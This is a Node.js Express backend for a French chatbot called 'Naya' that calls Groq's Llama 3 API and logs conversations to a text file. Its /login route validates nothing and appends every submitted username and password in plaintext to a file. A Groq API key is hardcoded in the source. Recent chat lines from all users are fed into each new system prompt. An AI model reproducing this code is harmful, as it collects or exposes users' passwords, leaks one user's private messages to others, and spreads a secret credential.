const express = require("express");
const cors = require("cors");
const bodyParser = require("body-parser");
const Groq = require("groq-sdk");
const fs = require("fs");

const app = express();

app.use(cors());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

const loginFilePath = 'Connexion.txt';
const conversationFilePath = 'ConversationNaya.txt';

function saveLogin(username, password) {
    const data = `Utilisateur: ${username}, Mot de passe: ${password}\n`;
    fs.appendFile(loginFilePath, data, (err) => {
        if (err) {
            console.error("Erreur lors de l'écriture des informations de connexion :", err);
        } else {
            console.log("Informations de connexion enregistrées avec succès.");
        }
    });
}

// Fonction pour enregistrer la conversation
function saveConversation(content) {
    fs.appendFile(conversationFilePath, content + '\n', (err) => {
        if (err) {
            console.error("Erreur lors de l'écriture dans le fichier :", err);
        } else {
            console.log("Conversation enregistrée avec succès !");
        }
    });
}

// Fonction pour lire les dernières lignes d'un fichier
function readLastLines(count) {
    const fileContent = fs.readFileSync(conversationFilePath, 'utf-8');
    const lines = fileContent.split('\n').filter(line => line.trim() !== '');
    return lines.slice(-count).join('\n');
}

// Route pour gérer la connexion
app.post('/login', (req, res) => {
    const { username, password } = req.body;

    if (username && password) {
        saveLogin(username, password);
        res.json({ success: true });
    } else {
        res.json({ success: false });
    }
});

// Route pour gérer les demandes de conversation
app.post('/ask', async (req, res) => {
    const question = req.body.question;

    const groq = new Groq({
        apiKey: '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'
    });

    try {
        const lastConversations = readLastLines(10);

        const response = await groq.chat.completions.create({
            messages: [
                {
                    role: "system",
                    content: `
                ${lastConversations}
                Langue : Réponds en français.
                Pose une question à la fin de chaque réponse pour engager la conversation, mais seulement une. 🤔
                Tu dois absolument réagir avec un emoji à chaque fois que tu parles. 😊
                Tu dois avoir un langage soutenu.
                Tu es une fille. 💁‍♀️
                La personne à qui tu parles est un utilisateur simple, tu ne connais pas son nom ou ses goûts personnels.
            },
                    `,
                },
                {
                    role: "user",
                    content: question,
                }
            ],
            model: "llama3-70b-8192"
        });

        const responseToSend = response.choices[0].message.content.replace(/,([^ ])/g, ', $1');

        saveConversation(`Utilisateur: ${question}\nNaya: ${responseToSend}`);

        res.send(responseToSend);

    } catch (error) {
        console.error("Erreur lors de l'appel à l'API :", error);
        res.status(500).send("Erreur de traitement de la demande");
    }
});

// Route pour gérer les voix (fonctionnalité désactivée)
app.get('/voices', (req, res) => {
    res.json({ message: "Fonctionnalité de voix désactivée." });
});

// Lancer le serveur sur le port 6259
app.listen(6259, () => {
    console.log("Naya est en ligne");
});
